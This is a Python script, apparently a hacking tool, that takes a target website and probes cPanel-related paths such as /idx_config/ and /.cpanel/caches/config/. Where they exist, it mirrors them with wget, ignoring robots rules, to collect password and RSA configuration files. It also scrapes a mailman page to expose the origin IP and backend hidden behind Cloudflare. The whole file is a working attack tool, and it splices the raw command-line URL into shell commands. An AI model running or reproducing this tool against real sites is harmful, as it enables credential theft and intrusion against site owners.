import sys
import requests 
import os
import colorama

from urllib.parse import urlparse
from colorama import Fore, Back, Style





def check():
    if len(sys.argv) < 2:
       os.system('clear')
       
       print (f"\n\n sorry Please Supply A Website To Test")
       sys.exit()
    else:
         print("") 

check()
    
def banner():
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    
    print(f"""

                        
    
      {r}   ___   __                 _               
      {g}  / __\ / /  ___  _   _  __| |___ ___ _ __  
      {r} / /   / /  / _ \| | | |/ _` / __/ __| '_ \ 
      {g}/ /___/ /__| (_) | |_| | (_| \__ \__ \ |_) |
      {r}\____/\____/\___/ \__,_|\__,_|___/___/ .__/ 
                                          {g}|_|
                                         
                {g}*                       *{r}  
         {r}*                                   {r}*
                   {g}| {w}Made By Nano  {g}|   
           
        """)

            
            
def exploits():
    
    
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    banner()
    
    url = sys.argv[1]+''
    
    c = requests.get(url+'/cpanel?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ') 
    if c.status_code == 404:
           print(f'{w}\nCPANEL {g}= {r}Not found')
             
    
              
    
    
    
    
    
    p = requests.get(url+'//idx_config/?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ') 
    if p.status_code == 404:
              
              print(f'{w}\nPassword Configs {g}= {r}Not found')
              
              
    else:
            print(f"{w}Checking for Password Configs...\n")
            print(f"{g}Found {w}Password {r}Configs {g}({w}Might be {r}False{g})")
            os.system("wget --execute='robots = off' --mirror --reject='index.html*' --convert-links --no-parent --wait=1 "+sys.argv[1]+"//idx_config/" + ">/dev/null 2>&1")
            print(f"{w}File {g}> {r}/idx_config/ ")
    
    
    url = sys.argv[1]+''
    x = requests.get(url+'//.cpanel/caches/config/?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ')
    
    if x.status_code == 404:
              
              print(f'{w}\nRSA Configs {g}= {r}Not found\n')
              
              
    else:
            check()
            
            print(f"{w}Finding RSA Configs...\n")
            os.system("wget --execute='robots = off' --cut-dirs=3 --reject='index.html*' --mirror --convert-links --no-parent --wait=1 "+sys.argv[1]+"//.cpanel/caches/config/" + ">/dev/null 2>&1")
            
            print(f"{g}Found {w}CPANEL {r}Configs {g}({w}Might be {r}False{g})")
            print(f"{w}File {g}> {r}/.cpanel/caches/config/")
            print(f"\n{w}Checking For backend...\n")
    


    


def ight():
    
    
    
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    url = sys.argv[1]+''
    x = requests.get(url+'//mailman/listinfo/mailman?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ') 
    
    if x.status_code == 404:
              
              
              
              exploits()
    else:
          
          
          exploits()
          arg = sys.argv[1]+''
          with requests.get(arg, stream=True) as rsp:
                ip, port = rsp.raw._connection.sock.getpeername()
                
                print(f"{g}Found {w}CPANEL {r}Backend")
                print(f"{w}Url : {w}" + arg)
                print(f"{w}Protected ip : {r}" + ip)
                print(f"{w}Protected port :{r}",port)
                print(w + "\nBackend : " + g)
                os.system(f"curl "+sys.argv[1]+"//mailman/listinfo/mailman -s | grep /mailman/subscribe/mailman | cut -c31-110 | tee backend.txt")
                print("\n")
                
                
          
      


ight()


